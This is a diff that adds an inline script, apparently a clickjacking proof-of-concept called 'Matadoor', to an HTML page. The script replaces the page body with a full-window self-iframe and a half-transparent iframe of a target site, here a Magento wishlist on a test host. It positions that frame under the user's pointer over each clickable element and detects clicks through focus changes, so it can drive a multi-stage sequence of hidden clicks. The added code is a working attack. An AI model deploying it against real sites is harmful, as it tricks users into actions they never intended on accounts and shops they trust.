@@ -8,7 +8,173 @@
 		<noscript><link rel="stylesheet" href="assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
+	<script>
+		//Matadoor allows for clickjacking involving multiple stages. After each click in the iFrame - it moves the iFrame to the next (x,y) co-ordinates. Matadoor monitors which element has browser's focus. Moment when the iFrame receives the focus is interpretted as a click inside the iFrame. But that can just as well be caused by a text field or a button popping up inside that iFrame. For this reason for few seconds after the iFrame is created, and for few seconds after each click the Matadoor gets numb - will not react to any focus changes. Those values (in seconds) are kept in numbAfterStart and numbAfterClick variables. Those variables should cover the time till all elements in the iFrame are fully loaded (and hence will not be stealing focus any more).
+		//Matadoor renders vulnerable iFrame under the pointer of a mouse whenever it is over a clickable object. Removes the iFrame when the pointer leaves the clickable object. Clickable objects are defined by variable clickableClassName and array clickableTagNames
 
+		var matadoorInput = {"startURL":"https://magento.test/wishlist/","numbAfterStart":"4","frameWidth":"1680","frameHeight":"1224","iOpacity":0.5,"actionList":[{"x":750,"y":807,"numbAfterClick":"2"},{"x":710,"y":477,"numbAfterClick":"2"},{"x":616,"y":756,"numbAfterClick":"2"}],"clickableTagNames":["A","INPUT","BUTTON"],"clickableClassName":"MATADOOR_CLICKABLE"}
+
+		// -----------------CODE BELOW THIS LINE IS ALWAYS THE SAME------------------
+		var mouseX=0;
+		var mouseY=0;
+		var numbFrame=1;
+		var overClickableObject=0;
+		var currentClickableObject;
+		var stage=0;
+
+		function turnON_numbFrame()
+		{
+			document.getElementById("frame").style.left="-9999px";
+			document.getElementById("frame").style.top="-9999px";
+			numbFrame=1;
+		}
+
+		function turnOFF_numbFrame()
+		{
+			numbFrame=0;
+		}
+
+		function initialize()
+		{
+			document.getElementsByTagName("body")[0].innerHTML="<iframe id='ownFrame' src='"+window.location.href+"' style='position: fixed; top: 0px; bottom: 0px; right: 0px; width: 100%; border: none; margin: 0; padding: 0; overflow: hidden; height: 100%;' ></iframe><input type='text' id='dummy' style='width:1px; height:1px; opacity:0'> <div id='mouseUpBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseDownBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:300px;width:100%;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseRightBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div><div id='mouseLeftBlock' style='position:absolute;top:0;left:0;bottom:0;right:0;height:100%;width:300px;z-index: 11;background-color: rgba(155, 0, 0, 0.0)';></div> <iframe id='frame' src='"+ matadoorInput.startURL + "' style='width: "+ matadoorInput.frameWidth +"px;height: "+ matadoorInput.frameHeight + "px;position: absolute;left: -40;top: 130;z-index: 10;opacity: " +matadoorInput.iOpacity +";' ></iframe>";
+			document.getElementsByTagName("body")[0].style="overflow: hidden;";
+			keepFocusOnTextField();
+			function isClickable(element) {
+				var node = element;
+				while (node != null) {
+					if (matadoorInput.clickableTagNames.includes(node.tagName)) {
+						return true;
+					}
+					if ((node.classList) && (node.classList.contains(matadoorInput.clickableClassName))) {
+						return true;
+					}
+					node = node.parentNode;
+				}
+				return false;
+			}
+
+			function moveMouseBlocks(x,y)
+			{
+				document.getElementById("mouseUpBlock").style.top=(y-303)+"px";
+				document.getElementById("mouseDownBlock").style.top=(y+3)+"px";
+				document.getElementById("mouseRightBlock").style.left=(x+3)+"px";
+				document.getElementById("mouseLeftBlock").style.left=(x-303)+"px";
+				var hoverElement = document.getElementById("ownFrame").contentWindow.document.elementFromPoint(mouseX, mouseY);
+				if (isClickable(hoverElement))
+				{
+					overClickableObject=1;
+					currentClickableObject=hoverElement;
+				}
+				else
+				{
+					overClickableObject=0;
+				}
+				moveVulnIframe();
+			}
+
+			function moveVulnIframe()
+			{
+				if ((overClickableObject) && (!(numbFrame)) && (matadoorInput.actionList[stage]) )
+				{
+					document.body.style.cursor="pointer";
+					document.getElementById("frame").style.left=mouseX - matadoorInput.actionList[stage].x + "px";
+					document.getElementById("frame").style.top=mouseY - matadoorInput.actionList[stage].y+"px";
+				}
+				else
+				{
+					document.body.style.cursor="auto";
+					document.getElementById("frame").style.left="-9999px";
+					document.getElementById("frame").style.top="-9999px";
+				}
+			}
+
+
+			document.getElementById("ownFrame").contentWindow.onmousemove = function(e){
+				mouseX=e.clientX;
+				mouseY=e.clientY;
+				moveMouseBlocks(mouseX,mouseY);
+			}
+			onmousemove = function(e){
+				mouseX=e.clientX;
+				mouseY=e.clientY;
+				moveMouseBlocks(mouseX,mouseY);
+			}
+
+			function log_click(x,y)
+			{
+				stage=stage+1;
+				if (!(matadoorInput.actionList[stage] ))
+				{
+					clearInterval(loopInterval);
+				}
+				currentClickableObject.click();
+
+			}
+
+			function keepFocusOnTextField()
+			{
+
+				var counter=0; // ticks of passing 0.25s intervals
+				var clickLogged=0;  // Was a click recognized? When click detected - don't grab focus right away. Give the user time to release the mouse button. Otherwise it will not be a valid click for the iFramed website.
+
+
+				timeLock=matadoorInput.numbAfterStart*4;    // Whenever delaying any action, script uses timeLock variable. Here it prevents Matadoor from interpreting initial focus changes during loading of the iFrame. For example if the iframed website is a search engine - it will surely put a "|" prompt on its search box. That is a sign of grabing focus into that box. If you do not use the "numb" variable, or it is too short and the numb period ends before the search box gets rendered - Matador will falsely interpret this as a click.
+				function setFocus () {
+					counter=counter+1;
+
+
+					var dummyEl = document.getElementById("dummy");
+					var isFocused = (document.activeElement !== document.getElementById("frame"));
+					if (!(isFocused)){      // Enter if focus on iFrame detected
+						if (counter >timeLock)   // Make sure not in numb period
+						{
+							if (clickLogged)   // The click was already logged, the user had time to release the button, now its time to block user's input for a while - to make sure that the next clicks happen after the page is fully rendered.
+							{
+								counter=0;
+								timeLock=matadoorInput.actionList[stage].numbAfterClick*4;
+								turnON_numbFrame();
+								dummyEl.focus();
+								clickLogged = 0;
+							}
+							else  // User has clicked. Log it, but give him a moment to release a button. For a browser a click is a key_down and key_up event duo. If you take the focus out of the iframe before the key_up happens - the iFrame will do nasty things.
+							{
+								log_click(mouseX, mouseY);
+								clickLogged = 1;
+								counter=0;
+								timeLock=3;   //time for a user to release the button. Three ticks = 0.75 seconds
+							}
+						}
+						else
+						{
+							if (numbFrame)
+							{
+								dummyEl.focus();   // Matadoor needs to shift focus to any object other than the iFrame. Otherwise it will not recognize any further clicks. The whole trick is about interpreting a focus switch as a click. If the focus stays on the iFrame - there will be no further switches, and no further recognized clicks.
+							}
+						}
+					}
+					else
+					{
+						if (counter > timeLock)   // iFrame not in focus, numb period gone - it's clear to remove the block screen and allow the user to register more clicks
+						{
+							turnOFF_numbFrame();
+						}
+					}
+
+
+
+				}
+				loopInterval = setInterval(setFocus, 250);
+			}
+
+		}
+
+		//Trick here is that the vulnerable page is not the only iFrame in the scenario. The website you control is also opened in the iFrame. This way the code storing Matadoor data is the parrent frame, allowing to survive mutliple clicks within the controlled website. Controlled website is opened in a full-window iFrame, so it looks genuine but doesn't kill the Matadoor session during clicking links. Vulnerable page is in the iFrame under your pointer.
+		if (window.self === window.top )
+		{
+			console.log("Starting Matadoor");
+			window.onload=initialize;
+		}
+	</script>
 		<!-- Wrapper -->
 			<div id="wrapper" class="fade-in">
 
